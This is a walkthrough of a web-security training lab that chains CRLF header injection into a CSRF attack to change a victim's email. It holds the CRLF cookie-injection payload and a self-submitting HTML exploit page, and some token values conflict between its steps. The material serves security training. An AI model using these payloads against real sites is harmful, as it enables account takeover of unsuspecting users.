## CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Possibility to leave a comment on a post
- Search page
- Exploit server
- /login

## Resume

1. Login with `wiener:peter`
2. Change your email and capture the request
3. Reuse your `csrfKey` and `csrf` token
4. Abuse CRLF injection in search feature
5. Inject your `csrfKey` cookie into victim browser
6. Send CSRF exploit with injected cookie

## Solve

First login with your account and update your email once.

Capture the request with Burp Suite :

```http
POST /my-account/change-email HTTP/2
Host: 0a20001204c7ca1880280d9a001600fe.web-security-academy.net
Cookie: session=YOUR_SESSION; csrfKey=YOUR_CSRF_KEY
Content-Type: application/x-www-form-urlencoded

email=toto%40mail.com&csrf=76e3ATeWr5GOr3IxnbhUVhLiXdRR8yRv
```

If you modify the `session` cookie, you get logged out.

If you only modify the `csrfKey` cookie, the request fails because the CSRF token no longer matches.

This means the application validates :

- `csrf` parameter
- `csrfKey` cookie

But the `csrfKey` is **not bound to the session**.

You can confirm this by using another account and replacing :

- `csrfKey`
- `csrf`

with the values from your first account.

The request is still accepted.


Now look for a way to inject cookies into the victim browser.

Perform a search request and observe that the search term is reflected inside the `Set-Cookie` response header.

This leads to a CRLF injection vulnerability.

Craft the following payload :

```http
/?search=test%0d%0aSet-Cookie:%20csrfKey=RVRvmm3llR9ZuiLBnaQWawUeM1cIg58H%3b%20SameSite=None
```

The payload injects a new cookie into the victim browser :

```http
Set-Cookie: csrfKey=76e3ATeWr5GOr3IxnbhUVhLiXdRR8yRv; SameSite=None
```

Now generate a CSRF PoC using the email change request :

```html
<html>
  <body>

    <form action="https://0a20001204c7ca1880280d9a001600fe.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com">
      <input type="hidden" name="csrf" value="RVRvmm3llR9ZuiLBnaQWawUeM1cIg58H">
      <input type="submit" value="Submit request">
    </form>

    <img src="https://0a20001204c7ca1880280d9a001600fe.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=76e3ATeWr5GOr3IxnbhUVhLiXdRR8yRv%3b%20SameSite=None"
         onerror="document.forms[0].submit()">

  </body>
</html>
```

The exploit works in two steps :

1. The `<img>` request injects your `csrfKey` cookie into the victim browser.
2. The form is automatically submitted with your valid CSRF token.

Because the application does not bind the `csrfKey` to the victim session, the CSRF validation succeeds.

Store the payload on the **Exploit Server** and deliver it to the victim.